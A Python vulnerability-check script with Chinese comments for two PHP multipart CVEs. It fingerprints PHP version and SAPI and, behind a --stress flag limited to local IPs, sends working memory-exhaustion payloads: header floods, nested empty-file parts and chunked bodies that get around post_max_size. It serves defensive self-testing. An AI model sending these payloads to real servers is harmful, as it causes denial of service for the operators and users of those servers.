#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell-probe —— CVE-2026-109618 / CVE-2026-109619 非破坏性可利用性探测

它做三件事：
  1. 复现官方安全公告里公开的三条 multipart OOM 触发策略
     （不可用 Content-Length / part 内 header 洪水 / 空文件控件 + 嵌套字段名）
  2. 采集官方建议的检测信号
     （memory_limit 类错误、PHPSESSID 响应 Cookie 异常膨胀、状态码异常、worker 抖动）
  3. 给出“是否命中漏洞路径”的判断

它明确不做的事：
  · 不构造任何代码执行载荷
  · 不做堆布局猜解、堆喷、OPcache 类型混淆、伪造 unserialize 状态
  · 不尝试突破任何访问控制

警告：探测会故意让目标消耗大量内存，可能导致 worker 重启、短时不可用。
      默认是 dry-run，只打印将要发送的请求。拿到书面授权后再加 --yes。
      没有信号 ≠ 安全：利用还要求生产/消费请求命中同一 worker 且内存布局配合。

用法：
  python3 probe.py --url http://127.0.0.1:8080/            # 预演
  python3 probe.py --url http://127.0.0.1:8080/ --yes      # 实际探测
  python3 probe.py --url https://staging.example.com/ --yes --rounds 5 --json
"""

import argparse
import ipaddress
import json
import random
import re
import socket
import ssl
import string
import sys
import time
from urllib.parse import urlsplit

UA = "php2shell-check/1.0 (defensive self-test)"

# 探测期间固定使用同一个会话 id：跨请求残留状态只会在同一会话的连续请求上显现
DEFAULT_COOKIE = None

# 官方检测信号里与内存相关的错误文案
OOM_PATTERN = re.compile(
    r"Allowed memory size|out of memory|Out of memory|OutOfMemory|memory_limit",
    re.IGNORECASE,
)

# 正常的 PHPSESSID 是 26 个字符；超过阈值视为可疑膨胀
SESSID_SUSPICIOUS_LEN = 64
SESSID_STRONG_LEN = 256


def rand_token(n=16):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


# ----------------------------------------------------------------- 报文构造

PROGRESS_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"


def _progress_part(boundary, tag):
    """官方已确认的关键细节：请求里只要出现 PHP_SESSION_UPLOAD_PROGRESS 字段，
    session upload progress 每次请求都会被激活，应用也无需调用 session_start()。
    109619 的已确认利用链正是以这个消费者的残留状态为入口，
    所以少了这个字段，探测根本没走到受影响的代码路径上。"""
    return [
        b"--" + boundary,
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"',
        b"",
        tag.encode(),
    ]


def build_header_flood(boundary, headers=20000, session_progress=True):
    """策略二：单个 multipart part 内塞入大量 header。
    PHP 内部表示这些 header 的内存远大于线上字节，可在 post_max_size 内吃穿 memory_limit。"""
    out = []
    if session_progress:
        out += _progress_part(boundary, rand_token(24))
    out += [b"--" + boundary,
            b'Content-Disposition: form-data; name="a"']
    pad = "A" * 16
    for i in range(headers):
        out.append(("X-P-%d: %s" % (i, pad)).encode())
    out.append(b"")
    out.append(b"x")
    out.append(b"--" + boundary + b"--")
    out.append(b"")
    return b"\r\n".join(out)


def build_empty_files(boundary, parts=1000, depth=8, session_progress=True):
    """策略三：大量空文件控件（filename=""）不计入 max_file_uploads，却仍创建文件元数据数组；
    嵌套字段名让生成的数组工作量成倍放大。

    parts 默认 1000 是实测出来的：本机 PHP 8.1.33 服务端日志已出现
    「Multipart body parts limit exceeded 1020. To increase the limit change
    max_multipart_body_parts in php.ini」，说明 PHP 自身就有 part 数上限。
    超限的请求会被直接拒绝、根本进不到内存放大环节，所以探测必须留在上限内，
    否则测出来的是这道边界而不是漏洞路径。"""
    out = []
    if session_progress:
        out += _progress_part(boundary, rand_token(24))
    for i in range(parts):
        name = "f" + "".join("[k%d]" % d for d in range(depth)) + "[%d]" % i
        out.append(b"--" + boundary)
        out.append(('Content-Disposition: form-data; name="%s"; filename=""' % name).encode())
        out.append(b"Content-Type: application/octet-stream")
        out.append(b"")
    out.append(b"--" + boundary + b"--")
    out.append(b"")
    return b"\r\n".join(out)


# 说明：早期想法是「声明一个错误的 Content-Length」来绕过 post_max_size 预检，实测不可行——
# 服务端直接判定 Malformed HTTP request，请求根本到不了 multipart 解析器
# （PHP 内建服务器日志：Invalid request (Malformed HTTP request)）。
# 正确做法是分块传输且完全不给 Content-Length，见 make_request(chunked=True)。


def make_request(method, path, host_header, body, boundary=None, declared_len=None,
                 chunked=False, cookie=None):
    """拼装原始 HTTP 请求，便于完全控制 Content-Length / Transfer-Encoding。

    带上固定的 PHPSESSID Cookie 是必要的：109619 的残留状态体现在
    会话 id 与 upload progress 消费者之间，没有会话就观察不到任何跨请求信号。
    """
    lines = []
    lines.append(("%s %s HTTP/1.1" % (method, path)).encode())
    lines.append(("Host: %s" % host_header).encode())
    lines.append(("User-Agent: %s" % UA).encode())
    lines.append(b"Accept: */*")
    cookie = cookie or DEFAULT_COOKIE
    if cookie:
        lines.append(("Cookie: %s" % cookie).encode())
    lines.append(b"Connection: close")

    if body is not None:
        lines.append(b"Content-Type: multipart/form-data; boundary=" + boundary)
        if chunked:
            lines.append(b"Transfer-Encoding: chunked")
        if declared_len is not None:
            lines.append(("Content-Length: %d" % declared_len).encode())
        elif not chunked:
            lines.append(("Content-Length: %d" % len(body)).encode())

    raw = b"\r\n".join(lines) + b"\r\n\r\n"
    if body is not None:
        if chunked:
            # RFC 9112 分块编码：整条请求不出现 Content-Length，
            # 服务端无法在读取前预判解码后的体积，post_max_size 的预检因此失效。
            # 这是策略一的正解——之前直接声明一个错误 Content-Length 会让报文被判为
            # Malformed HTTP request，请求根本到不了 multipart 解析器。
            step = 8192
            for i in range(0, len(body), step):
                piece = body[i:i + step]
                raw += ("%X\r\n" % len(piece)).encode() + piece + b"\r\n"
            raw += b"0\r\n\r\n"
        else:
            raw += body
    return raw


# ----------------------------------------------------------------- 传输层

def send_raw(host, port, raw, use_tls, timeout, sni=None, max_read=512 * 1024):
    sock = None
    started = time.time()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=sni or host)
        sock.sendall(raw)

        chunks, total = [], 0
        while total < max_read:
            block = sock.recv(65536)
            if not block:
                break
            chunks.append(block)
            total += len(block)
        return b"".join(chunks), time.time() - started, None
    except Exception as exc:                                    # noqa: BLE001
        return b"", time.time() - started, "%s: %s" % (type(exc).__name__, exc)
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:                                   # noqa: BLE001
                pass


def parse_response(data):
    if not data:
        return {"status": None, "code": None, "headers": [], "body": ""}
    head, _, body = data.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = lines[0].decode("latin-1", "replace") if lines else ""
    code = None
    parts = status.split()
    if len(parts) >= 2 and parts[1].isdigit():
        code = int(parts[1])
    headers = []
    for ln in lines[1:]:
        if b":" in ln:
            k, v = ln.split(b":", 1)
            headers.append((k.decode("latin-1", "replace").strip(),
                            v.decode("latin-1", "replace").strip()))
    return {
        "status": status,
        "code": code,
        "headers": headers,
        "body": body[:4000].decode("latin-1", "replace"),
    }


def longest_phpsessid(resp):
    """返回响应里最长的 PHPSESSID 值长度（用于识别内存泄露信号）。"""
    best = None
    for key, value in resp.get("headers", []):
        if key.lower() != "set-cookie":
            continue
        if "PHPSESSID=" not in value:
            continue
        raw = value.split("PHPSESSID=", 1)[1].split(";", 1)[0]
        if best is None or len(raw) > best:
            best = len(raw)
    return best


def has_oom_error(resp):
    return bool(OOM_PATTERN.search(resp.get("body", "") or ""))


# ----------------------------------------------------------------- 安全护栏

# 为什么不能直接用 ipaddress 的 is_private 判断"是不是内网"：
# 它把 198.18.0.0/15（RFC 2544 网络设备基准测试保留段）也算作 private，
# 而代理软件的 fake-ip 模式（Clash 一类默认就用 198.18.0.0/16）正是把任意域名
# 解析到这个段。实测本机 example.com 解析结果为 198.18.0.100，
# 于是一个货真价实的公网域名被旧逻辑判定成"私网"，护栏直接失效。
# 所以这里只认明确列举的内网段，并且绝不把域名解析结果当作可信输入。

_PRIVATE_V4 = (
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
)
_PRIVATE_V6 = (ipaddress.ip_network("fc00::/7"),)


def ip_is_local(ip):
    """只认回环、链路本地、RFC1918 私网、IPv6 ULA。明显排除 198.18.0.0/15。"""
    if ip.version == 4:
        if ip.is_loopback or ip.is_link_local:
            return True
        return any(ip in net for net in _PRIVATE_V4)
    if ip.is_loopback or ip.is_link_local:
        return True
    return any(ip in net for net in _PRIVATE_V6)


def host_is_private(host):
    """无害层用：目标是字面 IP 就直接判，是域名则要求所有解析结果都是内网。

    注意这个结论只用于"是否要 --allow-remote 才继续"，不构成加压层授权依据。
    """
    try:
        return ip_is_local(ipaddress.ip_address(host))
    except ValueError:
        pass
    try:
        infos = socket.getaddrinfo(host, None)
    except Exception:                                            # noqa: BLE001
        return False
    addrs = [i[4][0] for i in infos]
    if not addrs:
        return False
    for addr in addrs:
        try:
            ip = ipaddress.ip_address(addr)
        except ValueError:
            return False
        if not ip_is_local(ip):
            return False
    return True


def stress_target_allowed(host):
    """加压层用：只接受字面 IP，且必须是回环/私网，域名一律拒绝。

    域名解析结果不可信——fake-ip、DNS 劫持、CDN、本地 hosts 都能让它指向别处，
    所以"解析出来是内网"永远不能证明"实际打的是内网"。
    返回 (是否允许, 拒绝原因)。
    """
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False, ("目标是域名而不是 IP 字面量，无法确认它实际解析到哪里"
                       "（DNS 可能被 fake-ip 或劫持改写）")
    if not ip_is_local(ip):
        return False, "目标 IP %s 不是回环或私网地址" % ip
    return True, ""


# ----------------------------------------------------------------- 无害探测层
#
# 这一层是给生产环境用的：所有请求体都小于 2KB、结构完全合法，
# 一个普通 GET 加一个只带单个 session progress 字段的极小 multipart。
# 不发 header 洪水、不堆 part 数，因此不可能把目标内存打穿，也就没有 DoS 风险。
#
# 为什么必须有这一层：OOM 加压探测的前提是先把 memory_limit 吃穿，而生产配置下
# 这几乎做不到——实测 20000 条 header 只有 0.76MB，128M 内存的靶机零 OOM、判定恒为
# NO_SIGNAL。这种"测不出"没有任何信息量，反而容易被误读成"安全"。
# 真正能回答"我的部署在不在受影响区间"的是版本、SAPI 和入口可达性，
# 这三项都能在不碰目标内存的前提下拿到。

AFFECTED_RANGES = (
    ((8, 2, 0), (8, 2, 35)),
    ((8, 3, 0), (8, 3, 36)),
    ((8, 4, 0), (8, 4, 27)),
    ((8, 5, 0), (8, 5, 12)),
)

FIXED_BRANCHES = {
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}

VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")

# SAPI 风险分级取自官方公告与 Wiz 的分析：
# mod_php / FrankenPHP 已有实测的未认证 RCE；FPM / LSAPI 受影响但公开材料未给出完整利用验证。
SAPI_RISK = {
    "apache2handler": ("CRITICAL", "mod_php：请求启动失败仍无条件执行 request shutdown，攻击发生在应用代码之前"),
    "frankenphp": ("CRITICAL", "Go 嵌入模式，行为与 mod_php 接近"),
    "fpm": ("HIGH", "源码分析受影响，要求生产与消费请求命中同一 worker"),
    "lsapi": ("HIGH", "与 FPM 类似，公开材料标注可能但未验证"),
    "cli-server": ("MEDIUM", "单进程内建服务器，最容易复现但极少用于生产"),
    "unknown": ("UNKNOWN", "未能从响应头识别 SAPI，需在目标机上执行 php -i 或查看 FPM/Apache 配置"),
}


def classify_sapi(server_hdr, xpb):
    """从响应头推断 SAPI。伪装或反代会让它失准，所以结论只当线索用。"""
    text = ("%s %s" % (server_hdr or "", xpb or "")).lower()
    if "frankenphp" in text:
        return "frankenphp"
    if "apache" in text:
        return "apache2handler"
    if "litespeed" in text:
        return "lsapi"
    if "nginx" in text:
        # 反代后面的 PHP 多半是 FPM，但也可能什么都没跑
        return "fpm"
    if "development server" in text:
        return "cli-server"
    return "unknown"


def classify_version(ver):
    """返回 (状态, 该分支修复版本)。状态取值 affected / patched / eol / unknown。"""
    if ver is None:
        return "unknown", None
    for lo, hi in AFFECTED_RANGES:
        if lo <= ver < hi:
            return "affected", FIXED_BRANCHES.get(ver[:2])
    fixed = FIXED_BRANCHES.get(ver[:2])
    if fixed and ver >= fixed:
        return "patched", fixed
    if ver[:2] in ((7, 4), (8, 0), (8, 1)):
        return "eol", None
    return "unknown", fixed


def build_progress_probe(boundary):
    """单个 session progress 字段 + 一个 16 字节文件，整条报文约 400 字节。
    用途只有一个：确认服务端会不会激活 session upload progress 消费者，
    也就是 109619 已确认路径的入口是否可达。"""
    out = []
    out += _progress_part(boundary, rand_token(24))
    out.append(b"--" + boundary)
    out.append(b'Content-Disposition: form-data; name="f"; filename="a.txt"')
    out.append(b"Content-Type: text/plain")
    out.append(b"")
    out.append(b"A" * 16)
    out.append(b"--" + boundary + b"--")
    out.append(b"")
    return b"\r\n".join(out)


def run_safe_layer(host, port, path, host_header, use_tls, args):
    """无害探测主流程。不发 --yes 也执行：它本来就不做任何有副作用的事。"""
    scheme = "https" if use_tls else "http"
    print("无害探测：%s://%s:%d%s" % (scheme, host, port, path))
    print("本层请求体均小于 2KB 且结构合法，不会造成内存压力。")
    print("─" * 78)

    # 1) GET 基线：只读响应头
    raw = make_request("GET", path, host_header, None)
    resp, elapsed, err = send_raw(host, port, raw, use_tls, args.timeout)
    r = parse_response(resp)
    print("  %-20s %-24s %6.2fs" % (
        "baseline-get", r.get("status") or ("<无响应: %s>" % (err or "")), elapsed))

    server_hdr, xpb = "", ""
    for k, v in r.get("headers", []):
        lk = k.lower()
        if lk == "server":
            server_hdr = v
        elif lk == "x-powered-by":
            xpb = v

    ver = None
    for text in (xpb, server_hdr):
        m = VERSION_PATTERN.search(text or "")
        if m:
            ver = tuple(int(g) for g in m.groups())
            break

    sapi = classify_sapi(server_hdr, xpb)
    risk, risk_note = SAPI_RISK[sapi]

    # 2) 入口可达性：极小 multipart
    boundary = ("----php2shell" + rand_token()).encode()
    body = build_progress_probe(boundary)
    raw = make_request("POST", path, host_header, body, boundary=boundary)
    resp2, elapsed2, err2 = send_raw(host, port, raw, use_tls, args.timeout)
    r2 = parse_response(resp2)
    sessid2 = longest_phpsessid(r2)
    print("  %-20s %-24s %6.2fs  sessid=%s" % (
        "progress-probe", r2.get("status") or ("<无响应: %s>" % (err2 or "")), elapsed2,
        "N/A" if sessid2 is None else sessid2))
    reachable = sessid2 is not None

    state, fixed = classify_version(ver)

    if state == "unknown":
        verdict = "UNKNOWN_VERSION"
    elif state == "patched":
        verdict = "PATCHED"
    elif state == "eol":
        verdict = "EOL_BRANCH"
    elif state == "affected":
        verdict = "AFFECTED_REACHABLE" if reachable else "AFFECTED"
    else:
        verdict = "UNKNOWN_VERSION"

    version_txt = ".".join(str(x) for x in ver) if ver else "未识别"
    fixed_txt = ".".join(str(x) for x in fixed) if fixed else "对应分支最新版本"

    reasons = []
    reasons.append("识别到 PHP 版本：%s（来源：%s）" % (
        version_txt,
        "X-Powered-By" if xpb and VERSION_PATTERN.search(xpb) else
        ("Server 头" if ver else "无，目标未暴露版本信息")))
    reasons.append("SAPI 风险：%s —— %s" % (risk, risk_note))
    reasons.append("session 入口：%s" % (
        "可达（响应出现 PHPSESSID，109619 的消费路径被激活）" if reachable
        else "未观察到 PHPSESSID（可能未开 upload progress，或应用自行管理会话）"))

    if verdict == "AFFECTED_REACHABLE":
        reasons.append("结论：版本落在受影响区间，且 session 消费入口可达，属于需要立即处理的目标。"
                       "升级到 %s 或更高版本是唯一完整方案。" % fixed_txt)
    elif verdict == "AFFECTED":
        reasons.append("结论：版本落在受影响区间。session 入口未观察到，但这不降低版本风险，"
                       "仍应升级到 %s。" % fixed_txt)
    elif verdict == "PATCHED":
        reasons.append("结论：版本已高于该分支修复版本（%s），109618 与 109619 均已修复。" % fixed_txt)
    elif verdict == "EOL_BRANCH":
        reasons.append("结论：所在分支已 EOL，不在官方修复版本列表中，只能依赖安全团队的 "
                       "minimal source backport，或迁移到受支持分支（8.2.35 / 8.3.36 / 8.4.27 / 8.5.12）。")
    else:
        reasons.append("结论：无法确定版本。请到目标机上执行 php -v 或访问 phpinfo() 获取准确版本后再判断。")

    reasons.append("本层只做被动识别，不验证可利用性。要观察 OOM 路径需改用加压层"
                   "（--stress，仅限回环/私网目标）。")

    report = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "mode": "safe",
        "target": "%s://%s:%d%s" % (scheme, host, port, path),
        "verdict": verdict,
        "reasons": reasons,
        "detected": {
            "php_version": version_txt,
            "version_state": state,
            "fixed_version_for_branch": fixed_txt,
            "sapi": sapi,
            "sapi_risk": risk,
            "server_header": server_hdr,
            "x_powered_by": xpb,
            "session_entry_reachable": reachable,
        },
        "caveats": [
            "本层不发送任何可能造成内存压力的报文，因此结果反映的是部署事实，不是可利用性。",
            "版本信息来自响应头，可能被隐藏或篡改；准确版本请以 php -v 为准。",
            "SAPI 由响应头推断，反代场景下可能失准，需结合目标机配置确认。",
        ],
    }

    if args.json:
        print(json.dumps(report, ensure_ascii=False, indent=2))
        return 0

    print("─" * 78)
    print("判定：%s" % verdict)
    for item in reasons:
        print("  · %s" % item)
    print()
    print("提醒：")
    for c in report["caveats"]:
        print("  · %s" % c)
    return 0


# ----------------------------------------------------------------- 主流程

def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618 / CVE-2026-109619 非破坏性可利用性探测")
    ap.add_argument("--url", required=True, help="目标 URL，例如 http://127.0.0.1:8080/")
    ap.add_argument("--rounds", type=int, default=3, help="攻击轮数（默认 3，上限 10）")
    ap.add_argument("--headers", type=int, default=20000, help="header 洪水条数（默认 20000）")
    ap.add_argument("--files", type=int, default=1000,
                    help="空文件控件个数（默认 1000，须低于服务端 max_multipart_body_parts 默认值 1020）")
    ap.add_argument("--timeout", type=float, default=20.0, help="单请求超时秒数")
    ap.add_argument("--delay", type=float, default=1.0, help="请求间隔秒数")
    ap.add_argument("--yes", action="store_true", help="确认已获授权，真正发送探测请求")
    ap.add_argument("--stress", action="store_true",
                    help="【加压层】复现 OOM 触发策略，会故意让目标吃内存、可能造成 worker 重启。"
                         "必须同时满足 --yes 且目标是回环或私网地址")
    ap.add_argument("--allow-remote", action="store_true",
                    help="允许对公网地址做无害探测（默认拒绝）；该开关不能用于开启加压层")
    ap.add_argument("--json", action="store_true", help="输出 JSON 报告")
    args = ap.parse_args()

    args.rounds = max(1, min(args.rounds, 10))
    parts = urlsplit(args.url)
    if parts.scheme not in ("http", "https") or not parts.hostname:
        print("错误：--url 必须是 http:// 或 https:// 开头的完整地址", file=sys.stderr)
        return 2

    use_tls = parts.scheme == "https"
    host = parts.hostname
    port = parts.port or (443 if use_tls else 80)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    host_header = host if parts.port is None else "%s:%d" % (host, parts.port)

    remote_ok = host_is_private(host) or args.allow_remote
    if not remote_ok:
        print("拒绝执行：目标解析到公网地址。请对自己拥有的主机探测，"
              "确有必要时显式加 --allow-remote，并确认你已获得授权。", file=sys.stderr)
        return 2

    # ---- 加压层门槛：--stress 之外还要两道 ----
    # 这里刻意用 stress_target_allowed 而不是 host_is_private：加压是唯一会伤到
    # 目标的动作，所以连"域名解析到内网"都不接受——DNS 结果可能是代理的 fake-ip
    # （198.18.0.0/16）或劫持，"解析出来是内网"无法证明"实际打的是内网"。
    if args.stress:
        allowed, why = stress_target_allowed(host)
        if not allowed:
            print("拒绝加压：%s。" % why, file=sys.stderr)
            print("--stress 只接受 IP 字面量形式的回环/私网目标，例如 127.0.0.1、"
                  "10.0.0.10。对公网主机加压等同于制造 DoS，本工具不提供这条路；"
                  "要把目标打到内存耗尽，请在隔离环境里用 IP 直接指定。", file=sys.stderr)
            return 2
    if args.stress and not args.yes:
        print("拒绝加压：--stress 会故意让目标吃内存，必须同时加 --yes 确认已获授权。",
              file=sys.stderr)
        return 2

    # 默认走无害层：不做任何有副作用的事，因此不需要 --yes
    if not args.stress:
        return run_safe_layer(host, port, path, host_header, use_tls, args)

    # ---- 加压层：计划清单（dry-run 也打印，便于复核将要做什么）----
    # 命中窗口由两个 ini 共同决定，实测反复在这里出错，所以先讲清楚：
    #   线上字节数必须 < post_max_size（否则请求体被 PHP 丢弃，multipart 解析根本不发生，
    #   服务端秒回 200 且零内存增长——这不是"没漏洞"，是根本没测到）；
    #   同时内部放大后的内存必须 > memory_limit（否则吃不出 OOM）。
    # 推论：靶机不能只调 memory_limit，还要把 post_max_size 抬到远高于载荷字节数，
    # 例如 php -d memory_limit=8M -d post_max_size=64M -S 127.0.0.1:PORT。
    print()
    print("提示：加压能否命中取决于 post_max_size 与 memory_limit 的相对关系——")
    print("      载荷字节数需 < post_max_size（否则请求体被丢弃、压根不解析），")
    print("      而内部放大后需 > memory_limit。靶机建议同时抬高 post_max_size。")
    print()
    plan = [
        {"name": "baseline-1", "desc": "正常 GET，采集 PHPSESSID 基线长度"},
        {"name": "oom-chunked-no-length", "desc": "策略一：分块传输、不声明 Content-Length + header 洪水"},
        {"name": "oom-header-flood", "desc": "策略二：单 part 内 %d 条 header" % args.headers},
        {"name": "oom-empty-files-nested", "desc": "策略三：%d 个空文件控件 + 8 层嵌套字段名" % args.files},
        {"name": "baseline-2", "desc": "再取一次 GET，比较 PHPSESSID 长度是否膨胀"},
    ]

    if not args.yes:
        print("== DRY-RUN（未发送任何请求）==")
        print("目标   : %s://%s:%d%s  (TLS=%s)" % (parts.scheme, host, port, path, use_tls))
        print("轮数   : %d   请求间隔: %.1fs   单请求超时: %.1fs" % (args.rounds, args.delay, args.timeout))
        print("将执行 :")
        for i, item in enumerate(plan, 1):
            print("  %d. %-26s %s" % (i, item["name"], item["desc"]))
        print()
        print("这会故意让目标消耗大量内存，可能造成 worker 重启或短时不可用。")
        print("确认已获授权后加 --yes 实际执行。")
        return 0

    observations = []
    baseline_sessid = None
    peak_sessid = None
    oom_hits = 0
    error_hits = 0

    def record(name, resp, elapsed, err):
        nonlocal baseline_sessid, peak_sessid, oom_hits, error_hits
        sessid = longest_phpsessid(resp)
        oom = has_oom_error(resp)
        if oom:
            oom_hits += 1
        if err or (resp.get("code") or 0) >= 500 or not resp.get("code"):
            error_hits += 1
        if sessid is not None:
            if peak_sessid is None or sessid > peak_sessid:
                peak_sessid = sessid
        item = {
            "name": name,
            "http_status": resp.get("status"),
            "code": resp.get("code"),
            "elapsed_s": round(elapsed, 3),
            "phpsessid_len": sessid,
            "oom_error_in_body": oom,
            "error": err,
            "body_head": (resp.get("body") or "")[:300],
        }
        observations.append(item)
        status_txt = resp.get("status") or ("<无响应: %s>" % (err or "连接被关闭"))
        print("  %-26s %-28s %6.2fs  sessid=%s%s" % (
            name, status_txt, elapsed,
            "N/A" if sessid is None else sessid,
            "  [OOM 文案命中]" if oom else ""))
        return item

    print("开始探测：%s://%s:%d%s" % (parts.scheme, host, port, path))
    print("─" * 78)

    # 1) 基线
    raw = make_request("GET", path, host_header, None)
    resp, elapsed, err = send_raw(host, port, raw, use_tls, args.timeout)
    item = record("baseline-1", parse_response(resp), elapsed, err)
    baseline_sessid = item["phpsessid_len"]
    time.sleep(args.delay)

    # 固定会话 id：109619 的残留状态只在同一会话的连续请求之间显现
    global DEFAULT_COOKIE
    DEFAULT_COOKIE = "PHPSESSID=" + rand_token(26)

    # 2) 三轮 OOM 诱导
    for round_no in range(args.rounds):
        boundary = ("----php2shell" + rand_token()).encode()

        # 策略一：分块传输、不给 Content-Length，服务端无法预检解码后体积
        body = build_header_flood(boundary, args.headers)
        raw = make_request("POST", path, host_header, body, boundary=boundary, chunked=True)
        resp, elapsed, err = send_raw(host, port, raw, use_tls, args.timeout)
        record("r%d-chunked-no-length" % (round_no + 1), parse_response(resp), elapsed, err)
        time.sleep(args.delay)

        # 策略二
        body = build_header_flood(boundary, args.headers)
        raw = make_request("POST", path, host_header, body, boundary=boundary)
        resp, elapsed, err = send_raw(host, port, raw, use_tls, args.timeout)
        record("r%d-header-flood" % (round_no + 1), parse_response(resp), elapsed, err)
        time.sleep(args.delay)

        # 策略三
        body = build_empty_files(boundary, args.files)
        raw = make_request("POST", path, host_header, body, boundary=boundary)
        resp, elapsed, err = send_raw(host, port, raw, use_tls, args.timeout)
        record("r%d-empty-files" % (round_no + 1), parse_response(resp), elapsed, err)
        time.sleep(args.delay)

    # 3) 复测基线
    raw = make_request("GET", path, host_header, None)
    resp, elapsed, err = send_raw(host, port, raw, use_tls, args.timeout)
    item2 = record("baseline-2", parse_response(resp), elapsed, err)
    final_sessid = item2["phpsessid_len"]

    # ---------------- 判定 ----------------
    verdict = "NO_SIGNAL"
    reasons = []

    disclosure = None
    if baseline_sessid is not None and final_sessid is not None:
        if final_sessid > baseline_sessid + 40:
            disclosure = True
            reasons.append("PHPSESSID 响应 Cookie 从 %d 字节膨胀到 %d 字节" % (baseline_sessid, final_sessid))
    if peak_sessid is not None:
        if peak_sessid >= SESSID_STRONG_LEN:
            disclosure = True
            reasons.append("出现 %d 字节的 PHPSESSID（正常为 26 字节），符合内存泄露信号" % peak_sessid)
        elif peak_sessid >= SESSID_SUSPICIOUS_LEN and disclosure is None:
            reasons.append("出现 %d 字节的 PHPSESSID，属可疑但未达强信号阈值" % peak_sessid)

    if disclosure:
        verdict = "DISCLOSURE_SIGNAL"
    elif oom_hits > 0:
        # 只要响应里出现内存溢出文案，就说明请求已被内存限制打断——这正是 109618 的攻击前提。
        # 是否伴随 5xx 只取决于 display_errors：开启时错误回显进 body、状态码仍是 200；
        # 关闭时错误只进服务端日志。所以不能用 5xx 作为判定 HIT_PATH 的必要条件。
        verdict = "HIT_PATH"
        reasons.append("OOM 诱导请求命中了内存溢出路径（%d 次命中内存错误文案）" % oom_hits)
        if error_hits > 0:
            reasons.append("%d 次请求返回 5xx 或连接异常，进一步印证请求被内存限制打断" % error_hits)
        else:
            reasons.append("响应码均为 2xx，说明错误文案是随响应体回显的（display_errors 开启）；"
                           "生产环境通常关闭它，届时需改查服务端 error_log 中的 Allowed memory size 记录")
    elif error_hits > 0:
        verdict = "PARTIAL"
        reasons.append("出现 %d 次异常响应但未命中内存错误文案，未形成稳定信号" % error_hits)
    else:
        reasons.append("未观察到内存溢出或会话标识异常")

    report = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "target": "%s://%s:%d%s" % (parts.scheme, host, port, path),
        "verdict": verdict,
        "reasons": reasons,
        "stats": {
            "rounds": args.rounds,
            "requests": len(observations),
            "oom_error_hits": oom_hits,
            "error_responses": error_hits,
            "baseline_phpsessid_len": baseline_sessid,
            "final_phpsessid_len": final_sessid,
            "peak_phpsessid_len": peak_sessid,
        },
        "observations": observations,
        "caveats": [
            "本工具只复现公开的 OOM 触发策略并采集检测信号，不包含任何代码执行载荷。",
            "判定为 NO_SIGNAL 不等于安全：利用还要求生产与消费请求命中同一 worker，"
            "并配合具体版本的内存布局；单次探测失败不代表不可利用。",
            "判定为 HIT_PATH / DISCLOSURE_SIGNAL 表示已命中漏洞路径或出现强相关信号，"
            "应立即升级到 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 或对应分支更高版本。",
            "多 worker 部署、pool 动态伸缩、worker 回收都会降低单次命中率，需增加轮数或降低并发后再测。",
        ],
    }

    if args.json:
        print(json.dumps(report, ensure_ascii=False, indent=2))
        return 0

    print("─" * 78)
    print("判定：%s" % verdict)
    for r in reasons:
        print("  · %s" % r)
    print()
    print("统计：请求 %d 次｜OOM 文案命中 %d｜异常响应 %d｜PHPSESSID 基线 %s → 复测 %s（峰值 %s）" % (
        len(observations), oom_hits, error_hits,
        baseline_sessid, final_sessid, peak_sessid))
    print()
    print("提醒：")
    for c in report["caveats"]:
        print("  · %s" % c)
    return 0


if __name__ == "__main__":
    sys.exit(main())
